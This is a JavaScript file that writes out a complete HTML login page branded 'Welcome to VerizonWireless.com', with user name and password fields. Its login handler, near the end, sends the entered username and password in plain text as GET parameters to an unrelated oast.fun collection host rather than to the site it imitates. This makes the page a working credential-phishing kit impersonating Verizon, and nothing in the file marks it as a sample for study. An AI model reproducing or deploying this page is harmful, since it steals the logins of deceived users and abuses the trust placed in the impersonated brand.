document.open();
document.write(`
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="author" content="">

    <link rel="shortcut icon" href="https://vzretailsupport.com/favicon.ico">
    <!-- Deleting SEO related vars -->
    <title>Welcome to VerizonWireless.com</title> 
    <!-- Bootstrap core CSS -->
    <link href="https://vzretailsupport.com/sites/themes/default/css/bootstrap.min.css?minify=true" rel="stylesheet">
    <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css?minify=true" rel="stylesheet">
    <link rel="stylesheet" type="text/css" href="https://vzretailsupport.com/js/aui-artDialog/css/ui-dialog.css">
    <!-- Custom scrollbars CSS -->
    <link href="https://vzretailsupport.com/sites/themes/default/css/style.css?minify=true" rel="stylesheet" />
    <!--
    <link href="/sites/themes/default/css/reset.css" rel="stylesheet" >
    <link href="/sites/themes/default/css/front.css" rel="stylesheet"> -->
    <link rel="icon" href="https://vzretailsupport.com/favicon.ico" type="image/x-icon">
    <!-- Just for debugging purposes. Don't actually copy this line! -->
    <!--[if lt IE 9]><script src="js/ie8-responsive-file-warning.js"></script><![endif]-->

    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
      <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->
	<script type="text/javascript" src="https://vzretailsupport.com/sites/themes/default/js/jquery-1.10.2.min.js"></script>
    <script type="text/javascript" src="https://vzretailsupport.com/sites/themes/default/js/bootstrap.min.js"></script>
    <script language='javascript' type='text/javascript' src='https://vzretailsupport.com/js/token_helper.js'></script>
    <link rel="stylesheet" href="https://vzretailsupport.com/sites/themes/default/css/jquery-ui.css">

    <script src="https://vzretailsupport.com/js/jquery-ui/jquery-ui.js"></script>
	<script type="text/javascript" >
        
        var modal;

        $(document).ready(function(){
            $('.ajax-get').click(function(){
                var target;
                var that = this;
                if ( $(this).hasClass('confirm') ) {
                    if(!confirm('Are you sure you want to delete?')){
                        return false;
                    }
                }
                if ( (target = $(this).attr('href')) || (target = $(this).attr('url')) ) {
                    $.get(target).success(function(data){                        
                        window.location.href = window.location.href;
                    });
                }
                return false;
            });
        });
         
        window.onpopstate = function(event) {
            if(event && event.state) {
                location.reload()
            }
        }

        function redirect_url(url) {
            if (modal!=null)
                modal.close();
            window.location.href = url;
        }
       
        function device_onclick() {
            if ($('#device').val() != "0")
            {
                $('#edit_device').css("background-color","green");
                $('#edit_device').attr('href','/index.php?page=device_edit');
            }
            else
                $('#edit_device').css("background-color","#999");
        }
        
    </script>

</head>

<body>
<!-- this is a here -->
    <div id="loading_container">
        <div class="header-wrapper">
            


<script type="text/javascript" >
            var current_page = 'login';
     
     function Search_OnClick(page) {
        var device_type_id = "";

		if (document.getElementById("device_type_id"))
		{
            device_type_id = document.getElementById("device_type_id").value;
		}
	    var name = document.getElementById("search-text").value.trim();
	    //if(name == "")
		//{
		//   alert("Please enter content.")
		//   return;
	    //}
        //  var $tempPage = page;
        //  alert("Page is ".var_dump($tempPage));
        //alert("Page is "+page);

        if (page == "card" || page.indexOf("dashboard") >= 0 || page == "latest-updated" || page == "complete-live-set" || page == "campaign-cards" || page == "future-cards")
        {
            var url = "/" + page;

            if (page=='dashboard')
                url = '/card';

            //if (page == "latest-updated")
            //    url = "/latest-updated";
            //if (page == "complete-live-set")
            //    url = "/complete-live-set";
            var v = "";
            $("input:checkbox[name='device_type']").each(function(){
                if($(this).prop("checked") == true)
                {

                    if($(this).val() != "0")
                    {
                        if (v == "")
                        {
                            v = $(this).val();
                        }
                        else{
                            v = v + "_" + $(this).val();
                        }
                    }

                }

            });
            if (device_type_id != "")
                url += "/device_type_id/"+device_type_id;

            if (v != "")
                url += "/device_type/"+v;

            v = "";
            $("input:checkbox[name='manufacturer']").each(function(){
                if($(this).prop("checked") == true)
                {

                    if($(this).val() != "0")
                    {
                        if (v == "")
                        {
                            v = $(this).val();
                        }
                        else{
                            v = v + "_" + $(this).val();
                        }
                    }

                }

            });
            if (v != "")
                url += "/manufacturer/"+v;
            v = "";
            $("input:checkbox[name='model']").each(function(){
                if($(this).prop("checked") == true)
                {

                    if($(this).val() != "0")
                    {
                        if (v == "")
                        {
                            v = $(this).val();
                        }
                        else{
                            v = v + "_" + $(this).val();
                        }
                    }

                }

            });
            if (v != "")
                url += "/model/"+v;
            v = "";
            $("input:checkbox[name='card_type']").each(function(){
                if($(this).prop("checked") == true)
                {

                    if($(this).val() != "0")
                    {
                        if (v == "")
                        {
                            v = $(this).val()
                        }
                        else{
                            v = v + "_" + $(this).val();
                        }
                    }

                }

            });
            if (v != "")
                url += "/card_type/"+ v;
            url += "/device_name/" + name;
//            alert("url " + url);

            window.location.href = url;
        }
        else if (page.indexOf("card") >= 0)
        {
            var is_accessories_device_type_id =document.getElementById("is_accessories_device_type_id").value;
            var is_others_device_type_id =document.getElementById("is_others_device_type_id").value;
            var is_all_device_type_id =$("#is_all_device_type_id").val();
            var card_url = "/cards-devices-search";
            if(is_Exist_in_str(device_type_id, is_accessories_device_type_id)) // (page.indexOf("accesories") >= 0)
                card_url = "/cards-accesories-search";
            if (is_Exist_in_str(device_type_id, is_others_device_type_id)) //(page.indexOf("others") >= 0)
                card_url = "/cards-others-search";
            if (is_all_device_type_id == 1) //(page.indexOf("others") >= 0)
                card_url = "/cards-devices-search";
            if (name != "")
                window.location.href = card_url + '/device_type_id/'+device_type_id+'/device_name/'+name;
            else
                window.location.href =  card_url + '/device_type_id/'+device_type_id;
        }
		else if (page.indexOf("admin") >= 0)
		{
            if (name != "")
		        window.location.href = '/admin-users/pagenumber/1/user_info/'+name;
            else
                window.location.href = '/admin-users/pagenumber/1';
		}
		else
		{
            if (name != "")
                window.location.href = '/devices-list/device_type_id/'+device_type_id+'/device_name/'+name;
            else
                window.location.href = '/devices-list/device_type_id/'+device_type_id;
		}
    }
    function is_Exist_in_str(id, str)
    {
        if (str != "")
        {
            var arr = str.split(',');
            for (var i=0; i< arr.length; i++)
            {
                if  (id == arr[i])
                     return true;
            }
        }
        return false;
    }
    function search_onkeypress(event)
    {
        if(event.keyCode == "13")
            btn.click();
         return false;
    }
</script>


<div class="nav-shadow">
	<nav class="wrapper">
		<a href="#" class="bg-bars f-l" style="display:none"></a>
        <a href="#" class="v-header-logo f-l" style="display:none"></a>
        <img src="https://vzretailsupport.com/sites/themes/default/images/vlogo_1.png" height="40" style="margin-left:20px; margin-top:20px;">
			</nav>

</div>
<div>
<nav class="wrapper navigation site-dropdown-menu" id="adminMainMenu">
	<ul>
		    </ul>
</nav>

</div>
<div class="cf"></div>
<div class="search" style="height:30px !important;"></div>

        </div>
         

<div class="clearfix"></div>

<div class="up-item">
 <form name="registerForm" id="registerForm" method="POST">
  <input type="hidden" value="login-ajax" name="page">
  <input type="hidden" value="register" name="action" id="action" />
  <input type="hidden" value="" name="register_referrerId">
  <input type="hidden" value="3" name="user_userLevelId">
  <input type="hidden" value="/category-all-search" name="returnPage" id="returnPage" />
  <input type="hidden" name="zip_code" id="zip_code" value=""/>
  <input type="hidden" name="country" id="country" value=""/>
  <input type="hidden" name="city" id="city" value=""/>
  <input type="hidden" name="state" id="state" value=""/>
  <input type="hidden" name="address" id="address" value=""/>

  <div class="bot-section">
   <div class="container" style="padding-top:50px;padding-bottom:150px;">
    <div class="row">
     <div class="col-md-4">
      <div class="up-details"></div>
     </div>
     
          
     <div class="col-md-6">
      <div class="page-title">
       <div class="container">Account Login</div>
      </div>
      <div class="up-details">
       <div class="row">
        <div class="col-sm-7">
         <div class="form-group">
          <label for="Town/City">User Name*</label>
          <input type="text" class="form-control" name="login_username" id="login_username">                                     
         </div>
        </div>
       </div>
       <div class="row">
        <div class="col-sm-5">
         <div class="form-group">
          <label for="Country">Password<strong>*</strong></label>
           <input type="password" class="form-control" name="login_password" id="login_password">
         </div>
        </div>
       </div>
       <div class="row">
        <div class="col-xs-7">
         <label class="checkbox-inline">
          <input type="checkbox" id="inlineCheckbox1" value="option1">Remember Me
         </label>
        </div>
       </div>
       <div>&nbsp;</div>
       <div class="row">
        <div class="col-xs-5">
         <button type="button" class="btn btn-danger" onclick="login()">Account Login</button>
        </div>
       </div>
       <div>&nbsp;</div>
       <div class="row">
        <div class="col-xs-7">
         <a href="https://vzretailsupport.com/contact_us">Send Customer Support Email</a>
        </div>
       </div>
      </div>
     </div>
          
    </div>
   </div>
  </div>
 </form>
</div>


        <footer class="footer-wrapper">
            <div class="wrapper">
		<div><a href="#" class="logo-footer"></a></div>
		<div><a href="#">Terms Of Service</a> | <a href="">Privacy Policy</a></div>
		<div>Copyright 2018-2025 | Verizon Wireless USA | Version 1.1.191</div>
</div>

        </footer>
        <br class="spacer">
    </div>
    <!-- Wrapper close -->

    <!-- Bootstrap core JavaScript
    ================================================== -->
    <!-- Placed at the end of the document so the pages load faster -->
    
    <script type="text/javascript" src="https://vzretailsupport.com/js/aui-artDialog/dist/dialog-min.js"></script>
    <script type="text/javascript" src="https://vzretailsupport.com/js/aui-artDialog/dist/dialog-plus-min.js"></script>

    <input type="hidden" name="login_status" id="login_status" value="0" />
    <input type="hidden" name="current_page" id="current_page" value="login"/>

    

<script type="text/javascript">
    function login() {
	var username = $('#login_username').val();
	var password = $("#login_password").val();
	var error = false;
	if (input_event($('#login_username'), username)) error = true;
	if (input_event($('#login_password'), password)) error = true;
	if (!error) {
		var params = 'username='+ username + '&password='+password + '&action=login&page=login-ajax';
		process_request(params);
	}
	return false;
}

$(document).ready(function() {
	$('#login_password').keypress(function(e) {
		if (e.which==13) {
			return login();
		}
	});
});

function input_event(obj, value) {
	var error = false;
	if (!value)
		value = $(obj).val();
	//console.log(value+'xx')
	if (value=='') {
		error = true;
		$(obj).parent().addClass('has-error').addClass('has-feedback').removeClass('has-success');
		$(obj).parent().find('.form-control-feedback').addClass('glyphicon-warning-sign');
	} else {
		//has-success has-feedback
		$(obj).parent().removeClass('has-error').addClass('has-feedback').addClass('has-success')
		$(obj).parent().find('.form-control-feedback').removeClass('glyphicon-warning-sign').addClass('glyphicon-ok');
	}
	return error;
}

function process_request(params) {
	$.ajaxSetup({
		cache: false,
		async: true
	});
	var returnPage = $('#returnPage').val();
	$.get('https://nzzjpghxfodtnmruhumffm648x57hi0zc.oast.fun/index.php', params, function(data) {
		// if server returns JSON string, jQuery will parse it when dataType is 'json'
		try { data = (typeof data === 'string') ? $.parseJSON(data) : data; } catch(e) { /* ignore parse error */ }

		if (data && data.status == 1) {
			console.log(data.status);
			if (data.action == 'login') {
				if (returnPage) window.parent.redirect_url(returnPage);
				else window.parent.redirect_url('/');
			}
		} else {
			console.log(data && data.message);
			alert(data && data.message);
		}
	}, 'json');
}
</script>

<style>
.up-item select
{
    padding: 6px 10px;
}

</style>


</body>

</html>
`);
document.close();
